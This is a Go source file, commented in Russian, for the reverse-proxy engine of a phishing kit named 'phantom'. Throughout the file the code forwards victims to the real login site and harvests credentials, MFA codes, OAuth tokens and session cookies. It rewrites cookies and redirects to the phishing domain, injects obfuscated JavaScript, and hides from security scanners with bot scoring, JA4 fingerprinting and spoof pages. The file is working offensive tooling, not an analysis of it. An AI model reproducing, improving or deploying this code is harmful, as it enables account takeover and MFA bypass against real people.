// Package proxy — AiTM ReverseProxy MVP (std net/http).
// В отличие от старого phantom-proxy: реальный форвард, а не `return nil`.
package proxy

import (
	"bytes"
	"compress/gzip"
	"io"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/phantom-v2/phantom/core"
	"github.com/phantom-v2/phantom/internal/ja4"
	"github.com/phantom-v2/phantom/internal/metrics"
	"github.com/phantom-v2/phantom/internal/upstream"
)

type Engine struct {
	store    core.PhishletStore
	sessions core.SessionStore
	bus      core.EventBus // optional, nil ok
	scorer   core.BotScorer
	blocked  core.Blocklist
	lures    core.LureStore
	spoof    func(host string) string
	js       func(src string, seed int64) string
	limit    Limiter
	upstream map[string]string // origHost -> baseURL override (e2e/lab)
	transport http.RoundTripper
	fp       http.Handler
}

// Limiter — rate-limit интерфейс (реализация internal/ratelimit).
type Limiter interface{ Allow(ip string) bool }

func New(store core.PhishletStore, sessions core.SessionStore, bus core.EventBus) *Engine {
	return &Engine{store: store, sessions: sessions, bus: bus}
}

// SetGuard — Botguard + blocklist + spoof (опционально, Pro-паритет).
func (e *Engine) SetGuard(scorer core.BotScorer, blocked core.Blocklist, spoof func(host string) string) {
	e.scorer = scorer
	e.blocked = blocked
	e.spoof = spoof
}

// SetLures — проверка /l/* приманок (опционально).
func (e *Engine) SetLures(l core.LureStore) { e.lures = l }

// SetJS — полиморфная обфускация инжектов (опционально).
func (e *Engine) SetJS(fn func(src string, seed int64) string) { e.js = fn }

// SetLimiter — rate-limit (опционально).
func (e *Engine) SetLimiter(l Limiter) { e.limit = l }

// SetUpstream — переопределение цели для e2e/lab: origHost -> http://127.0.0.1:port.
func (e *Engine) SetUpstream(m map[string]string) { e.upstream = m }

// SetTransport — транспорт к апстриму (дефолт H2, опция uTLS chrome).
// Если не задан, используется upstream.Default().
func (e *Engine) SetTransport(rt http.RoundTripper) { e.transport = rt }

// SetChallenge — fingerprint challenge /__fp/* (обслуживается локально, не проксируется).
func (e *Engine) SetChallenge(h http.Handler) { e.fp = h }

func (e *Engine) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if e.fp != nil && strings.HasPrefix(r.URL.Path, "/__fp/") {
		e.fp.ServeHTTP(w, r)
		return
	}
	ph, host := e.store.FindByHost(r.Host)
	if ph == nil {
		e.renderSpoof(w, r)
		return
	}
	metrics.IncRequestsFor(ph.ID)

	ip := remoteIP(r)
	if e.limit != nil && !e.limit.Allow(ip) {
		http.Error(w, "rate limited", http.StatusTooManyRequests)
		return
	}
	fp := ja4.FromRequest(r)
	// Blocklist раньше всего.
	if e.blocked != nil && (e.blocked.Blocked(ip) || (fp != "" && e.blocked.Blocked(fp))) {
		e.renderSpoof(w, r)
		return
	}
	// Botguard.
	if e.scorer != nil && e.scorer.Score(r, fp) >= 80 {
		if e.bus != nil {
			_ = e.bus.Publish(r.Context(), "bot.blocked", map[string]string{"ip": ip, "host": r.Host})
		}
		e.renderSpoof(w, r)
		return
	}
	// Lure-check: /l/* обязан существовать (smart: TTL/uses/IP/challenge).
	if e.lures != nil && len(r.URL.Path) >= 3 && r.URL.Path[:3] == "/l/" {
		fpOK := cookie(r, "__fp_ok") == "1"
		if sr, ok := e.lures.(interface {
			ResolveSmart(path, ip string, fpOK bool) (string, bool)
		}); ok {
			if _, ok := sr.ResolveSmart(r.URL.Path, ip, fpOK); !ok {
				e.renderSpoof(w, r)
				return
			}
		} else if _, ok := e.lures.Resolve(r.URL.Path); !ok {
			e.renderSpoof(w, r)
			return
		}
	}


	// Сессия через cookie sid + валидация (anti-fixation) + привязка IP/JA4.
	sid := cookie(r, "sid")
	if sid != "" {
		if sess, err := e.sessions.Get(r.Context(), sid); err != nil {
			sid = ""
		} else if !bound(sess, ph.ID, ip, fp) {
			sid = ""
		}
	}
	if sid == "" {
		if sess, err := e.sessions.Create(r.Context(), ph.ID, remoteIP(r)); err == nil {
			sid = sess.ID
			sess.JA4 = fp // best-effort привязка (memory персистит, redis — через следующую итерацию)
			setSid(w, r, sid)
		}
	}

	// Захват creds/MFA на POST до проксирования (форма + JSON).
	if r.Method == http.MethodPost {
		ct := r.Header.Get("Content-Type")
		if strings.Contains(ct, "application/x-www-form-urlencoded") || strings.Contains(ct, "application/json") {
			if body, err := io.ReadAll(r.Body); err == nil {
				r.Body.Close()
				r.Body = io.NopCloser(bytes.NewReader(body))
				r.ContentLength = int64(len(body))
				bs := string(body)
				if captured(ph, bs) && e.bus != nil {
					_ = e.bus.Publish(r.Context(), "capture.creds", map[string]string{"session": sid, "phishlet": ph.ID, "ip": ip})
				}
				if key := capturedMFA(ph, bs); key != "" && e.bus != nil {
					_ = e.bus.Publish(r.Context(), "capture.mfa", map[string]string{"session": sid, "phishlet": ph.ID, "kind": key, "ip": ip})
				}
			}
		}
	}

	phishHost := r.Host
	origHost := host.OrigSub + "." + host.Domain
	target := &url.URL{Scheme: "https", Host: origHost}
	if e.upstream != nil {
		if ov, ok := e.upstream[origHost]; ok {
			if u, err := url.Parse(ov); err == nil {
				target = u
			}
		}
	}
	// WebSocket: инспектор фреймов (auth-токены via:ws) + ping/pong keepalive.
	// Не-WS апстрим внутри сам упадет в сырой TCP-туннель.
	if isWS(r) {
		e.wsProxy(w, r, target, origHost, ph, sid)
		return
	}
	rp := httputil.NewSingleHostReverseProxy(target)
	if e.transport != nil {
		rp.Transport = e.transport
	} else {
		rp.Transport = upstream.Default()
	}
	origDirector := rp.Director
	rp.Director = func(req *http.Request) {
		fwd := req.Host
		if fwd == "" {
			fwd = phishHost
		}
		origDirector(req)
		// Host апстриму — всегда оригинал (и в prod, и в e2e-override:
		// httptest-сервер Host игнорирует, а asserts его проверяют).
		req.Host = origHost
		req.Header.Set("X-Forwarded-Host", fwd)
	}
	rp.ModifyResponse = func(resp *http.Response) error {
		// Хост как пришел, с портом (лаб :8443 сохраняет работоспособность
		// редиректов; в проде на 443 порта нет — поведение то же).
		// Cookie-Domain внутри rewriteCookies чистится от порта отдельно.
		rewriteRedirect(resp, origHost, phishHost)
		rewriteCookies(resp, origHost, host.Domain, phishHost)
		markTokens(resp, ph, e.bus, r, sid)
		scanLocation(resp, ph, e.bus, r, sid)
		return e.rewriteBody(resp, ph, host, r, sid)
	}
	rp.ErrorHandler = func(w http.ResponseWriter, _ *http.Request, err error) {
		http.Error(w, "upstream error", http.StatusBadGateway)
		_ = err
	}
	rp.ServeHTTP(w, r)
}

func captured(ph *core.Phishlet, body string) bool {
	for _, c := range ph.CredsMap {
		if c.Search != "" && strings.Contains(body, c.Search) {
			return true
		}
	}
	return false
}

// capturedMFA возвращает key совпавшего mfa-правила ("" = нет).
func capturedMFA(ph *core.Phishlet, body string) string {
	for _, m := range ph.MfaTokens {
		if m.Search != "" && strings.Contains(body, m.Search) {
			if m.Key != "" {
				return m.Key
			}
			return "mfa"
		}
	}
	return ""
}

// oauthKeys — стандартные ключи каскадных OAuth-сценариев (Google/Telegram/Discord).
var oauthKeys = []string{"code=", "access_token", "id_token", "refresh_token"}

// scanLocation ловит токены каскада в редиректах (?code=, #access_token=).
func scanLocation(resp *http.Response, ph *core.Phishlet, bus core.EventBus, r *http.Request, sid string) {
	if bus == nil {
		return
	}
	loc := resp.Header.Get("Location")
	if loc == "" {
		return
	}
	lowl := strings.ToLower(loc)
	ip := remoteIP(r)
	check := func(key string) {
		if strings.Contains(lowl, strings.ToLower(key)) {
			_ = bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": key, "via": "location", "ip": ip})
		}
	}
	for _, k := range oauthKeys {
		check(k)
	}
	for _, t := range ph.AuthTokens {
		for _, k := range t.Keys {
			check(k + "=")
		}
	}
}

// scanJSON ловит токены в JSON-телах ответов (client_credentials, token exchange).
func scanJSON(ct string, body []byte, ph *core.Phishlet, bus core.EventBus, r *http.Request, sid string) {
	if bus == nil || !strings.Contains(strings.ToLower(ct), "json") {
		return
	}
	low := strings.ToLower(string(body))
	ip := remoteIP(r)
	hit := func(key string) bool { return strings.Contains(low, strings.ToLower(key)) }
	for _, k := range oauthKeys {
		if hit(strings.TrimSuffix(k, "=")) {
			_ = bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": strings.TrimSuffix(k, "="), "via": "json", "ip": ip})
			return
		}
	}
	for _, t := range ph.AuthTokens {
		for _, k := range t.Keys {
			if hit(k) {
				_ = bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": k, "via": "json", "ip": ip})
				return
			}
		}
	}
}

func markTokens(resp *http.Response, ph *core.Phishlet, bus core.EventBus, r *http.Request, sid string) {
	if len(ph.AuthTokens) == 0 || bus == nil {
		return
	}
	for _, setCookie := range resp.Header.Values("Set-Cookie") {
		for _, t := range ph.AuthTokens {
			for _, k := range t.Keys {
				if strings.Contains(setCookie, k+"=") {
					_ = bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": k, "ip": remoteIP(r)})
					return
				}
			}
		}
	}
}

func (e *Engine) rewriteBody(resp *http.Response, ph *core.Phishlet, host *core.ProxyHost, r *http.Request, sid string) error {
	ct := resp.Header.Get("Content-Type")
	// JSON-скан токенов каскада — независимо от sub_filters/js (иначе пропустим token exchange).
	if strings.Contains(strings.ToLower(ct), "json") && e.bus != nil {
		if peek, err := io.ReadAll(resp.Body); err == nil {
			resp.Body.Close()
			scanJSON(ct, peek, ph, e.bus, r, sid)
			resp.Body = io.NopCloser(bytes.NewReader(peek))
		}
	}
	if !isText(ct) || (len(ph.SubFilters) == 0 && len(ph.JsInject) == 0) {
		return nil
	}
	var reader io.Reader = resp.Body
	if strings.EqualFold(resp.Header.Get("Content-Encoding"), "gzip") {
		zr, err := gzip.NewReader(resp.Body)
		if err != nil {
			return nil // не ломаем ответ
		}
		defer zr.Close()
		reader = zr
		// Отдаем identity: пережатие gzip стоит CPU на каждом хите,
		// клиент получает plain + корректный Content-Length ниже.
		resp.Header.Del("Content-Encoding")
		resp.Header.Del("Content-Length")
		resp.ContentLength = -1
	}
	body, err := io.ReadAll(reader)
	resp.Body.Close()
	if err != nil {
		return nil
	}
	// Байтовые замены без string-конверсии: 1 аллокация вместо 2 на фильтр.
	origHost := host.OrigSub + "." + host.Domain
	for _, f := range ph.SubFilters {
		if f.TriggersOn != "" && f.TriggersOn != origHost {
			continue
		}
		if f.RedirectOnly || f.Search == "" {
			continue
		}
		body = bytes.ReplaceAll(body, []byte(f.Search), []byte(f.Replace))
	}
	// JS-инжекты с полиморфной обфускацией. Строгий триггер:
	// пустой = все HTML, иначе точное равенство origHost (case-insensitive).
	origLower := strings.ToLower(origHost)
	for _, j := range ph.JsInject {
		if j.Trigger != "" && !strings.EqualFold(strings.TrimSpace(j.Trigger), origHost) {
			_ = origLower
			continue
		}
		src := "/*phantom*/"
		if j.Src != "" {
			src = j.Src
		}
		if e.js != nil {
			src = e.js(src, time.Now().UnixNano())
		}
		tag := `<script>` + src + `</script>`
		tb := []byte(tag)
		if i := bytes.LastIndex(body, []byte("</body>")); i >= 0 {
			body = append(body[:i:i], append(tb, body[i:]...)...)
		} else {
			body = append(body, tb...)
		}
	}
	resp.Body = io.NopCloser(bytes.NewReader(body))
	resp.ContentLength = int64(len(body))
	resp.Header.Set("Content-Length", strconv.Itoa(len(body)))
	return nil
}

func isText(ct string) bool {
	ct = strings.ToLower(ct)
	return strings.Contains(ct, "text/html") ||
		strings.Contains(ct, "text/css") ||
		strings.Contains(ct, "text/xml") ||
		strings.Contains(ct, "application/xhtml") ||
		strings.Contains(ct, "image/svg+xml") ||
		strings.Contains(ct, "application/json") ||
		strings.Contains(ct, "javascript")
}

func cookie(r *http.Request, name string) string {
	c, err := r.Cookie(name)
	if err != nil {
		return ""
	}
	return c.Value
}

// bound — привязка сессии к phishlet+IP+JA4.
func bound(sess *core.Session, phishlet, ip, fp string) bool {
	if sess == nil || sess.Phishlet != phishlet {
		return false
	}
	if sess.IP != "" && ip != "" && sess.IP != ip {
		return false
	}
	if sess.JA4 != "" && fp != "" && sess.JA4 != fp {
		return false
	}
	return true
}

func setSid(w http.ResponseWriter, r *http.Request, sid string) {
	http.SetCookie(w, &http.Cookie{
		Name: "sid", Value: sid, Path: "/",
		HttpOnly: true, Secure: r.TLS != nil, SameSite: http.SameSiteLaxMode,
	})
}

func remoteIP(r *http.Request) string {
	if h := r.Header.Get("X-Forwarded-For"); h != "" {
		// первый IP из списка, без порта
		if i := strings.Index(h, ","); i >= 0 {
			h = h[:i]
		}
		return stripPort(strings.TrimSpace(h))
	}
	return stripPort(r.RemoteAddr)
}

func stripPort(h string) string {
	h = strings.TrimSpace(h)
	if strings.HasPrefix(h, "[") {
		if host, _, err := net.SplitHostPort(h); err == nil {
			return host
		}
		return strings.Trim(h, "[]")
	}
	if host, _, err := net.SplitHostPort(h); err == nil {
		return host
	}
	if strings.Count(h, ":") == 1 {
		if i := strings.LastIndex(h, ":"); i > 0 {
			return h[:i]
		}
	}
	return h
}

// rewriteRedirect переписывает Location с оригинала на фиш-хост.
func rewriteRedirect(resp *http.Response, origHost, phishHost string) {
	loc := resp.Header.Get("Location")
	if loc == "" || origHost == "" || phishHost == "" {
		return
	}
	if strings.Contains(loc, origHost) {
		resp.Header.Set("Location", strings.ReplaceAll(loc, origHost, phishHost))
	}
}

// rewriteCookies переписывает Domain в Set-Cookie с оригинала на фиш.
// Хост — как пришел (с портом для lab), Domain — всегда без порта.
func rewriteCookies(resp *http.Response, origHost, origDomain, phishHost string) {
	cookies := resp.Header.Values("Set-Cookie")
	if len(cookies) == 0 {
		return
	}
	resp.Header.Del("Set-Cookie")
	phishBase := stripPort(phishHost)
	if i := strings.Index(phishBase, "."); i > 0 {
		phishBase = phishBase[i+1:]
	}
	for _, c := range cookies {
		if origHost != "" {
			c = strings.ReplaceAll(c, origHost, phishHost)
		}
		if origDomain != "" && phishBase != "" {
			c = strings.ReplaceAll(c, origDomain, phishBase)
		}
		// Нормализация: SameSite по дефолту Lax, Path по дефолту /.
		low := strings.ToLower(c)
		if !strings.Contains(low, "samesite=") {
			c += "; SameSite=Lax"
		}
		if !strings.Contains(low, "path=") {
			c += "; Path=/"
		}
		resp.Header.Add("Set-Cookie", c)
	}
}

// isWS — детект WebSocket Upgrade.
func isWS(r *http.Request) bool {
	if !strings.EqualFold(r.Header.Get("Connection"), "Upgrade") &&
		!strings.Contains(strings.ToLower(r.Header.Get("Connection")), "upgrade") {
		// Connection может быть "keep-alive, Upgrade"
		if !strings.Contains(strings.ToLower(r.Header.Get("Connection")), "upgrade") {
			return false
		}
	}
	return strings.EqualFold(r.Header.Get("Upgrade"), "websocket")
}

// wsIdleTimeout — общий дедлайн WS-туннеля + TCP keepalive ловит мертвых пиров.
// Полный ping/pong контроль — следующим этапом (нужен WS-фрейминг).
const wsIdleTimeout = 10 * time.Minute

// wsTunnel — сырой TCP-туннель к upstream для WebSocket.
func (e *Engine) wsTunnel(w http.ResponseWriter, r *http.Request, target *url.URL, origHost string) {
	addr := target.Host
	if _, _, err := net.SplitHostPort(addr); err != nil {
		if target.Scheme == "https" {
			addr += ":443"
		} else {
			addr += ":80"
		}
	}
	dialer := &net.Dialer{Timeout: 10 * time.Second, KeepAlive: 30 * time.Second}
	up, err := dialer.DialContext(r.Context(), "tcp", addr)
	if err != nil {
		http.Error(w, "upstream error", http.StatusBadGateway)
		return
	}
	hj, ok := w.(http.Hijacker)
	if !ok {
		up.Close()
		http.Error(w, "hijack unsupported", http.StatusInternalServerError)
		return
	}
	client, _, err := hj.Hijack()
	if err != nil {
		up.Close()
		http.Error(w, "hijack failed", http.StatusInternalServerError)
		return
	}
	// Дедлайны с обеих сторон: зависшие концы не висят вечно (zombie sockets).
	deadline := time.Now().Add(wsIdleTimeout)
	_ = up.SetDeadline(deadline)
	if tc, ok := client.(*net.TCPConn); ok {
		_ = tc.SetKeepAlive(true)
		_ = tc.SetKeepAlivePeriod(30 * time.Second)
		_ = tc.SetDeadline(deadline)
	}
	// Пробрасываем запрос как есть, но с оригинальным Host.
	_ = origHost
	if err := r.Write(up); err != nil {
		up.Close()
		client.Close()
		return
	}
	// done-channel: первая завершившаяся копия закрывает оба конца,
	// вторая разблокируется ошибкой — горутины не текут.
	done := make(chan struct{})
	var once sync.Once
	closeBoth := func() {
		once.Do(func() {
			up.Close()
			client.Close()
			close(done)
		})
	}
	go func() {
		_, _ = io.Copy(up, client)
		closeBoth()
	}()
	go func() {
		_, _ = io.Copy(client, up)
		closeBoth()
	}()
	select {
	case <-done:
	case <-r.Context().Done():
		closeBoth()
	}
}

func (e *Engine) renderSpoof(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.Header().Set("X-Frame-Options", "DENY")
	w.Header().Set("Referrer-Policy", "no-referrer")
	if e.spoof != nil {
		_, _ = w.Write([]byte(e.spoof(r.Host)))
		return
	}
	http.Error(w, "not found", http.StatusNotFound)
}
